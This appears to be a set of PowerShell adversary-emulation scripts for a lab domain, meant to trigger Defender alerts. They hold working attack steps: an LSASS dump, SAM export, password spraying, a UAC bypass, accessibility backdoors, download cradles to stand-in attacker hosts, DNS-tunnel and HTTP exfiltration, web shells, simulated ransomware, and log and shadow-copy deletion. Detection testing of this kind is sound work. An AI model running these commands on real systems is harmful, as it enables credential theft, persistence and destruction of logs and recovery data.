
# SMB Phase 1 - Recon (workstation-specific)
$ErrorActionPreference = "SilentlyContinue"
Write-Host "SMB PHASE 1 - RECON"
whoami /all | Out-Null
whoami /priv | Out-Null
systeminfo | Out-Null
hostname | Out-Null
ipconfig /all | Out-Null
net user | Out-Null
net localgroup | Out-Null
net localgroup Administrators | Out-Null
net user /domain | Out-Null
net group "Domain Admins" /domain | Out-Null
nltest /dclist:corp.contoso.com 2>$null | Out-Null
netstat -ano | Out-Null
arp -a | Out-Null
route print | Out-Null
net share | Out-Null
Get-SmbShare | Out-Null
Get-SmbConnection | Out-Null
Get-NetFirewallProfile | Out-Null
Get-Service | Where-Object {$_.Status -eq "Running"} | Out-Null
Get-Process | Out-Null
Write-Host "SMB Recon DONE"



# SMB Phase 2 - Credential Access (workstation-specific: SAM, registry, file creds)
$ErrorActionPreference = "SilentlyContinue"
Write-Host "SMB PHASE 2 - CREDENTIAL ACCESS"

Write-Host "LSASS access..."
try {
    $lsass = Get-Process -Name "lsass"
    [System.Diagnostics.Process]::GetProcessById($lsass.Id) | Out-Null
    Write-Host "LSASS handle obtained"
} catch { Write-Host "LSASS blocked" }

Write-Host "LSASS dump via comsvcs..."
$p = (Get-Process lsass).Id
cmd.exe /c "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $p C:\Windows\Temp\d.dmp full" 2>$null
Remove-Item "C:\Windows\Temp\d.dmp" -Force -ErrorAction SilentlyContinue

Write-Host "SAM database export..."
reg save HKLM\SAM "$env:TEMP\s.hiv" 2>$null | Out-Null
reg save HKLM\SYSTEM "$env:TEMP\y.hiv" 2>$null | Out-Null
reg save HKLM\SECURITY "$env:TEMP\c.hiv" 2>$null | Out-Null
Remove-Item "$env:TEMP\s.hiv","$env:TEMP\y.hiv","$env:TEMP\c.hiv" -Force -ErrorAction SilentlyContinue

Write-Host "Credential Manager..."
cmdkey /list | Out-Null
vaultcmd /listcreds:"Windows Credentials" /all 2>$null | Out-Null

Write-Host "Registry stored creds..."
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null | Out-Null
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>$null | Out-Null

Write-Host "Files with passwords..."
Get-ChildItem -Path C:\Users -Recurse -Include "*.txt","*.xml","*.config","*.ini" -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|credential|secret" -ErrorAction SilentlyContinue | Select-Object -First 5 | Out-Null

Write-Host "SMB Credential Access DONE"



# SMB Phase 4 - Lateral Movement (workstation → DC probing, brute force)
$ErrorActionPreference = "SilentlyContinue"
Write-Host "SMB PHASE 4 - LATERAL MOVEMENT"

Write-Host "Network share discovery..."
Get-SmbShare | Out-Null
Get-SmbConnection | Out-Null
net share | Out-Null

Write-Host "SMB probing DC (10.0.1.4)..."
net use \\10.0.1.4\C$ 2>$null | Out-Null
net use \\10.0.1.4\ADMIN$ 2>$null | Out-Null
net use \\10.0.1.4\IPC$ 2>$null | Out-Null
net use \\10.0.1.4\SYSVOL 2>$null | Out-Null
net use \\10.0.1.4\NETLOGON 2>$null | Out-Null

Write-Host "WinRM probe to DC..."
try { Test-WSMan -ComputerName 10.0.1.4 -ErrorAction Stop | Out-Null } catch {}
try { Invoke-Command -ComputerName 10.0.1.4 -ScriptBlock { hostname } -Credential (New-Object PSCredential("fakeu",(ConvertTo-SecureString "fakeP1!" -AsPlainText -Force))) -ErrorAction Stop } catch {}

Write-Host "Brute force to DC (10 attempts)..."
$users = @("admin","administrator","svc_sql","svc_backup","helpdesk","dbadmin","netadmin","webadmin","sqladmin","testuser")
foreach ($u in $users) {
    try {
        net use \\10.0.1.4\IPC$ /user:corp\$u "WrongPass123!" 2>$null | Out-Null
        net use \\10.0.1.4\IPC$ /delete 2>$null | Out-Null
    } catch {}
}

Write-Host "RDP probe..."
$tcp = New-Object System.Net.Sockets.TcpClient
try { $tcp.Connect("10.0.1.4", 3389); $tcp.Close() } catch {}

Write-Host "PsExec-style probe..."
sc.exe \\10.0.1.4 query 2>$null | Out-Null

Write-Host "SMB Lateral Movement DONE"



# SMB Phase 5 - Persistence (workstation: services, tasks, registry, local accounts)
$ErrorActionPreference = "SilentlyContinue"
Write-Host "SMB PHASE 5 - PERSISTENCE"

Write-Host "Malicious service creation..."
sc.exe create WindowsTelemetryService binPath= "cmd.exe /c powershell.exe -ep bypass -c whoami" start= auto 2>$null | Out-Null
Start-Sleep -Seconds 8
sc.exe delete WindowsTelemetryService 2>$null | Out-Null
Write-Host "Service cleanup done"

Write-Host "Scheduled task - EdgeUpdate..."
schtasks /create /tn "EdgeUpdate" /tr "powershell.exe -ep bypass -c Get-Process" /sc daily /st 02:00 /f 2>$null | Out-Null
Start-Sleep -Seconds 5
schtasks /delete /tn "EdgeUpdate" /f 2>$null | Out-Null

Write-Host "Scheduled task - SysMaint..."
schtasks /create /tn "SysMaint" /tr "cmd.exe /c net user" /sc onlogon /f 2>$null | Out-Null
Start-Sleep -Seconds 5
schtasks /delete /tn "SysMaint" /f 2>$null | Out-Null

Write-Host "Registry Run keys..."
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -Value "powershell.exe -w hidden -c Start-Sleep 1" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDriveSync" -Value "cmd.exe /c echo sync" -Force
Start-Sleep -Seconds 8
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDriveSync" -Force -ErrorAction SilentlyContinue
Write-Host "Registry cleanup done"

Write-Host "Backdoor local account..."
net user support_svc "B@ckd00r2026!" /add 2>$null | Out-Null
net localgroup Administrators support_svc /add 2>$null | Out-Null
Start-Sleep -Seconds 10
net user support_svc /delete 2>$null | Out-Null
Write-Host "Account cleanup done"

Write-Host "WMI event subscription..."
$q = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
try {
    $f = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="TestFilter";EventNamespace="root\cimv2";QueryLanguage="WQL";Query=$q} -ErrorAction Stop
    Start-Sleep -Seconds 5
    $f | Remove-WmiObject -ErrorAction SilentlyContinue
} catch {}

Write-Host "SMB Persistence DONE"



# SMB Phase 6 - Exfiltration & C2 (workstation data theft, beacons)
$ErrorActionPreference = "SilentlyContinue"
Write-Host "SMB PHASE 6 - EXFILTRATION AND C2"

Write-Host "Automated document collection..."
$staging = "$env:TEMP\exfil_staging"
New-Item -ItemType Directory -Path $staging -Force | Out-Null
Get-ChildItem -Path C:\Users -Recurse -Include "*.docx","*.xlsx","*.pdf","*.pptx" -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {
    Copy-Item $_.FullName -Destination $staging -ErrorAction SilentlyContinue
}
Write-Host "Documents staged"

Write-Host "Data compression..."
$zipPath = "$env:TEMP\backup_data.zip"
try { Compress-Archive -Path $staging -DestinationPath $zipPath -Force } catch {}

Write-Host "C2 beacon simulation..."
$c2Domains = @("update.windowsliveupdater.com","cdn.microsoftedge-update.com","telemetry.msftconnect.com","api.onedrive-sync.com","dl.azurecdn-mirror.com")
foreach ($d in $c2Domains) {
    try { Resolve-DnsName $d -ErrorAction Stop | Out-Null } catch {}
    try { Invoke-WebRequest -Uri "https://$d/beacon" -TimeoutSec 3 -ErrorAction Stop | Out-Null } catch {}
}

Write-Host "DNS tunneling simulation..."
$dnsTargets = @("exfil.data-collector.net","c2.command-relay.org","drop.secure-transfer.io")
foreach ($d in $dnsTargets) {
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("user=$(whoami)&host=$env:COMPUTERNAME"))
    try { Resolve-DnsName "$encoded.$d" -ErrorAction Stop | Out-Null } catch {}
}

Write-Host "HTTP POST exfil attempt..."
try {
    $body = @{hostname=$env:COMPUTERNAME; user=$env:USERNAME; data="exfil_test"} | ConvertTo-Json
    Invoke-RestMethod -Uri "https://httpbin.org/post" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 5 -ErrorAction Stop | Out-Null
} catch {}

Write-Host "Cleanup staging..."
Remove-Item $staging -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

Write-Host "SMB Exfil/C2 DONE"



# SMB Phase 7 - Defense Evasion & Impact (firewall, rundll32, ransomware sim, log clear)
$ErrorActionPreference = "SilentlyContinue"
Write-Host "SMB PHASE 7 - EVASION AND IMPACT"

Write-Host "Event log clearing..."
wevtutil cl Security 2>$null
wevtutil cl System 2>$null
wevtutil cl Application 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

Write-Host "AV tamper attempt..."
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Start-Sleep -Seconds 5
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue

Write-Host "Firewall rule manipulation..."
netsh advfirewall firewall add rule name="Debug Port" dir=in action=allow protocol=tcp localport=4444 2>$null | Out-Null
netsh advfirewall firewall add rule name="Reverse Shell" dir=out action=allow protocol=tcp remoteport=443 2>$null | Out-Null
Start-Sleep -Seconds 8
netsh advfirewall firewall delete rule name="Debug Port" 2>$null | Out-Null
netsh advfirewall firewall delete rule name="Reverse Shell" 2>$null | Out-Null
Write-Host "Firewall cleanup done"

Write-Host "Rundll32 proxy execution..."
cmd.exe /c "rundll32.exe url.dll,OpenURL calc.exe" 2>$null
cmd.exe /c "rundll32.exe url.dll,FileProtocolHandler notepad.exe" 2>$null
Start-Sleep -Seconds 3
Stop-Process -Name "calc" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "CalculatorApp" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "notepad" -Force -ErrorAction SilentlyContinue

Write-Host "Encoded command execution..."
$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-Process | Select-Object -First 5"))
powershell.exe -EncodedCommand $cmd 2>$null | Out-Null

Write-Host "Timestomping..."
$testFile = "$env:TEMP\ts_test.txt"
"timestomp test" | Out-File $testFile
(Get-Item $testFile).CreationTime = "01/01/2020 12:00:00"
(Get-Item $testFile).LastWriteTime = "01/01/2020 12:00:00"
Remove-Item $testFile -Force -ErrorAction SilentlyContinue

Write-Host "Ransomware simulation..."
$ransomDir = "$env:TEMP\ransom_sim"
New-Item -ItemType Directory -Path $ransomDir -Force | Out-Null
$files = @("quarterly-report.docx","employee-data.xlsx","budget-2026.pdf","credentials.txt","project-plan.pptx")
foreach ($f in $files) {
    "SIMULATED CONTENT - $f" | Out-File "$ransomDir\$f"
    $content = Get-Content "$ransomDir\$f" -Raw
    $bytes = [Text.Encoding]::UTF8.GetBytes($content)
    $encoded = [Convert]::ToBase64String($bytes)
    $encoded | Out-File "$ransomDir\$f.encrypted"
    Remove-Item "$ransomDir\$f" -Force
}
@"
YOUR FILES HAVE BEEN ENCRYPTED
(This is a simulation for security testing only)
Contact: simulation@test.local
Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
"@ | Out-File "$ransomDir\README_DECRYPT.txt"
Write-Host "Ransomware sim created"
Start-Sleep -Seconds 10
Remove-Item $ransomDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "Ransomware cleanup done"

Write-Host "SMB Evasion/Impact DONE"
Write-Host "ALL SMB PHASES COMPLETE"




# SMB Phase 3 - Privilege Escalation (workstation-specific: UAC bypass, accessibility backdoors)
$ErrorActionPreference = "SilentlyContinue"
Write-Host "SMB PHASE 3 - PRIVILEGE ESCALATION"

Write-Host "UAC bypass via eventvwr..."
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(Default)" -Value "cmd.exe /c whoami > C:\Windows\Temp\uac.txt" -Force
Start-Process eventvwr.exe -ErrorAction SilentlyContinue
Start-Sleep -Seconds 5
Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\uac.txt" -Force -ErrorAction SilentlyContinue
Write-Host "UAC bypass done"

Write-Host "Sticky Keys backdoor..."
$sethcPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
New-Item -Path $sethcPath -Force | Out-Null
Set-ItemProperty -Path $sethcPath -Name "Debugger" -Value "cmd.exe" -Force
Start-Sleep -Seconds 10
Remove-Item $sethcPath -Force -ErrorAction SilentlyContinue
Write-Host "Sticky Keys cleanup done"

Write-Host "Narrator backdoor..."
$narratorPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Narrator.exe"
New-Item -Path $narratorPath -Force | Out-Null
Set-ItemProperty -Path $narratorPath -Name "Debugger" -Value "powershell.exe" -Force
Start-Sleep -Seconds 10
Remove-Item $narratorPath -Force -ErrorAction SilentlyContinue
Write-Host "Narrator cleanup done"

Write-Host "On-Screen Keyboard backdoor..."
$oskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
New-Item -Path $oskPath -Force | Out-Null
Set-ItemProperty -Path $oskPath -Name "Debugger" -Value "cmd.exe" -Force
Start-Sleep -Seconds 10
Remove-Item $oskPath -Force -ErrorAction SilentlyContinue
Write-Host "OSK cleanup done"

Write-Host "Token impersonation check..."
whoami /priv | Out-Null

Write-Host "SMB PrivEsc DONE"


# Generate Initial Access + Ransomware Alerts
# Run DIRECTLY on DC01 and SMB01 via RDP/console
# These techniques reliably trigger MDE alerts in those categories
$ErrorActionPreference = "Continue"

Write-Host "=== INITIAL ACCESS ALERT GENERATION ==="

# T1078.002 - Valid Accounts: Domain Accounts (brute force / password spray)
Write-Host "1. Password spray simulation (T1110.003 + T1078)"
@("admin","backup","sqlsvc","webadmin","helpdesk","finance","hr_admin","itadmin","svc_backup","testuser") | ForEach-Object {
    net use \\10.0.1.5\IPC$ /user:CORP\$_ "Password123!" 2>$null | Out-Null
    net use \\10.0.1.5\IPC$ /delete /y 2>$null | Out-Null
    net use \\10.0.1.5\IPC$ /user:CORP\$_ "Welcome1!" 2>$null | Out-Null
    net use \\10.0.1.5\IPC$ /delete /y 2>$null | Out-Null
    net use \\10.0.1.5\IPC$ /user:CORP\$_ "Summer2026!" 2>$null | Out-Null
    net use \\10.0.1.5\IPC$ /delete /y 2>$null | Out-Null
    net use \\10.0.1.4\IPC$ /user:CORP\$_ "Password123!" 2>$null | Out-Null
    net use \\10.0.1.4\IPC$ /delete /y 2>$null | Out-Null
}
Write-Host "  Password spray: 40 attempts across 10 accounts"
Start-Sleep 3

# T1078 - Suspicious account creation (triggers Initial Access + Persistence)
Write-Host "2. Rogue account creation (T1136 + T1078)"
net user InitialAccess1 P@ssw0rd123! /add /y 2>$null
net user InitialAccess2 P@ssw0rd123! /add /y 2>$null
net localgroup Administrators InitialAccess1 /add 2>$null
Start-Sleep 5

# T1078 - Account manipulation  
Write-Host "3. Account manipulation (T1098)"
net user InitialAccess1 NewP@ss789! 2>$null
Start-Sleep 3

# T1059.001 - Suspicious PowerShell download cradles (Initial Access tooling)
Write-Host "4. Download cradle simulation (T1059.001 + T1105)"
try { (New-Object Net.WebClient).DownloadString("http://evil-initial-access.com/payload.ps1") } catch {}
try { Invoke-WebRequest -Uri "http://malicious-dropper.net/stage1.exe" -OutFile "$env:TEMP\stage1.exe" -TimeoutSec 3 -ErrorAction SilentlyContinue } catch {}
try { Invoke-Expression (New-Object Net.WebClient).DownloadString("http://attack-framework.org/implant") } catch {}
try { certutil -urlcache -split -f "http://evil-payload.com/initial.exe" "$env:TEMP\initial.exe" 2>$null } catch {}
try { bitsadmin /transfer evil /download /priority high "http://malware-server.com/dropper.exe" "$env:TEMP\dropper.exe" 2>$null } catch {}
Remove-Item "$env:TEMP\stage1.exe","$env:TEMP\initial.exe","$env:TEMP\dropper.exe" -ErrorAction SilentlyContinue
Start-Sleep 3

# T1190 - Exploit Public-Facing Application (simulated web shell drop)
Write-Host "5. Web shell simulation (T1505.003)"
$webshellContent = '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c whoami"); %>'
$webshellPaths = @("C:\inetpub\wwwroot\shell.aspx", "C:\Windows\Temp\shell.aspx", "C:\Windows\Temp\cmd.aspx")
foreach ($p in $webshellPaths) {
    try { $webshellContent | Out-File $p -ErrorAction SilentlyContinue } catch {}
}
Start-Sleep 5
foreach ($p in $webshellPaths) { Remove-Item $p -Force -ErrorAction SilentlyContinue }

# T1133 - External Remote Services (suspicious RDP/remote logons)
Write-Host "6. Failed remote logon attempts (T1133 + T1021.001)"
@("10.0.1.4","10.0.1.5") | ForEach-Object {
    cmdkey /add:$_ /user:CORP\fakeadmin /pass:FakePass123 2>$null
    mstsc /v:$_ 2>$null
    Start-Sleep 2
    cmdkey /delete:$_ 2>$null
}
Start-Sleep 3

# T1566 - Phishing simulation (suspicious Office-like child processes)
Write-Host "7. Office child process simulation (T1566.001)"
Start-Process cmd.exe -ArgumentList "/c powershell.exe -nop -w hidden -c `"Write-Host phish`"" -ErrorAction SilentlyContinue
Start-Process cmd.exe -ArgumentList "/c certutil -urlcache -split -f http://phishing-payload.com/doc.exe C:\Windows\Temp\doc.exe" -ErrorAction SilentlyContinue
Start-Sleep 3
Remove-Item "C:\Windows\Temp\doc.exe" -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "=== RANSOMWARE ALERT GENERATION ==="

# T1486 - Data Encrypted for Impact (Variant 1: mass rename)
Write-Host "8. Ransomware - Mass file rename (T1486)"
$dir1 = "C:\temp\ransomware_sim1"
New-Item -ItemType Directory $dir1 -Force | Out-Null
1..30 | ForEach-Object { "Q4 Financial Report - Confidential Data Row $_" | Out-File "$dir1\report_$_.docx" }
1..20 | ForEach-Object { "Employee SSN: 123-45-$($_.ToString('D4'))" | Out-File "$dir1\employee_$_.xlsx" }
1..10 | ForEach-Object { "Customer PII Record $_" | Out-File "$dir1\customer_$_.csv" }
Get-ChildItem "$dir1\*.*" -Exclude "*.ENCRYPTED","*.txt" | Rename-Item -NewName { $_.Name + ".ENCRYPTED" }
"ALL YOUR FILES HAVE BEEN ENCRYPTED`nPAY 5 BTC TO: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`nContact: darkweb@onion.tor" | Out-File "$dir1\RANSOM_NOTE.txt"
Write-Host "  60 files renamed to .ENCRYPTED"
Start-Sleep 5

# T1486 - Data Encrypted for Impact (Variant 2: XOR encryption)
Write-Host "9. Ransomware - XOR encryption (T1486)"
$dir2 = "C:\temp\ransomware_sim2"
New-Item -ItemType Directory $dir2 -Force | Out-Null
1..25 | ForEach-Object { "CONFIDENTIAL: Board Meeting Notes - Strategic Plan $_" | Out-File "$dir2\boardnotes_$_.docx" }
1..15 | ForEach-Object { "Database Export - Production Row $_" | Out-File "$dir2\database_$_.sql" }
Get-ChildItem "$dir2\*.*" -Exclude "*.LOCKED","*.txt" | ForEach-Object {
    $bytes = [IO.File]::ReadAllBytes($_.FullName)
    for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor 0x42 }
    [IO.File]::WriteAllBytes("$($_.FullName).LOCKED", $bytes)
    Remove-Item $_.FullName
}
"YOUR NETWORK HAS BEEN COMPROMISED`nFiles encrypted with military-grade encryption`nPayment: 10 BTC`nDeadline: 72 hours" | Out-File "$dir2\DECRYPT_INSTRUCTIONS.txt"
Write-Host "  40 files XOR encrypted to .LOCKED"
Start-Sleep 5

# T1486 - Data Encrypted for Impact (Variant 3: byte reversal)
Write-Host "10. Ransomware - Byte reversal encryption (T1486)"
$dir3 = "C:\temp\ransomware_sim3"
New-Item -ItemType Directory $dir3 -Force | Out-Null
1..20 | ForEach-Object { "Patient Medical Record #$_ - HIPAA Protected" | Out-File "$dir3\patient_$_.pdf" }
1..15 | ForEach-Object { "Source Code - Proprietary Module $_" | Out-File "$dir3\source_$_.py" }
Get-ChildItem "$dir3\*.*" -Exclude "*.CRYPTED","*.txt" | ForEach-Object {
    $bytes = [IO.File]::ReadAllBytes($_.FullName)
    [array]::Reverse($bytes)
    [IO.File]::WriteAllBytes("$($_.FullName).CRYPTED", $bytes)
    Remove-Item $_.FullName
}
"RANSOMWARE: DarkSide v3.0`nAll files encrypted. No free decryptor available.`nContact us at darkside.onion" | Out-File "$dir3\README_DECRYPT.txt"
Write-Host "  35 files byte-reversed to .CRYPTED"
Start-Sleep 5

# T1490 - Inhibit System Recovery (common ransomware behavior)
Write-Host "11. Shadow copy deletion attempt (T1490)"
vssadmin delete shadows /all /quiet 2>$null
wmic shadowcopy delete 2>$null
bcdedit /set {default} recoveryenabled no 2>$null
Start-Sleep 3
bcdedit /set {default} recoveryenabled yes 2>$null

# T1489 - Service Stop (ransomware stops backup/security services)
Write-Host "12. Service stop simulation (T1489)"
@("VSS","wbengine","SstpSvc") | ForEach-Object {
    Stop-Service $_ -Force -ErrorAction SilentlyContinue 2>$null
    Start-Sleep 1
    Start-Service $_ -ErrorAction SilentlyContinue 2>$null
}

# Additional ransomware indicators
Write-Host "13. Ransomware note in multiple locations"
$note = "YOUR FILES ARE ENCRYPTED - PAY RANSOM OR LOSE DATA FOREVER"
$note | Out-File "C:\Users\Public\Desktop\RANSOM.txt" -ErrorAction SilentlyContinue
$note | Out-File "C:\Windows\Temp\RANSOM.txt" -ErrorAction SilentlyContinue
$note | Out-File "$env:USERPROFILE\Desktop\RANSOM.txt" -ErrorAction SilentlyContinue
Start-Sleep 3

Write-Host ""
Write-Host "=== CLEANUP ==="
# Remove rogue accounts
net user InitialAccess1 /delete 2>$null
net user InitialAccess2 /delete 2>$null
# Remove ransomware simulation files (keep for 30 sec for detection)
Start-Sleep 30
Remove-Item "C:\temp\ransomware_sim1" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "C:\temp\ransomware_sim2" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "C:\temp\ransomware_sim3" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Users\Public\Desktop\RANSOM.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\RANSOM.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:USERPROFILE\Desktop\RANSOM.txt" -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "=== DONE ==="
Write-Host "Expected alerts (15-60 min to appear in Defender portal):"
Write-Host "  INITIAL ACCESS:"
Write-Host "    - Suspicious account creation"
Write-Host "    - Password spray activity"  
Write-Host "    - Suspicious download / LOLBin abuse (certutil, bitsadmin)"
Write-Host "    - Suspicious PowerShell download cradle"
Write-Host "    - Web shell drop attempt"
Write-Host "    - Failed remote logon attempts"
Write-Host "  RANSOMWARE:"
Write-Host "    - Ransomware activity / File encryption detected"
Write-Host "    - Suspicious file rename (mass extension change)"
Write-Host "    - Shadow copy deletion (recovery inhibition)"
Write-Host "    - Suspicious service stop"
Write-Host "    - Ransom note creation"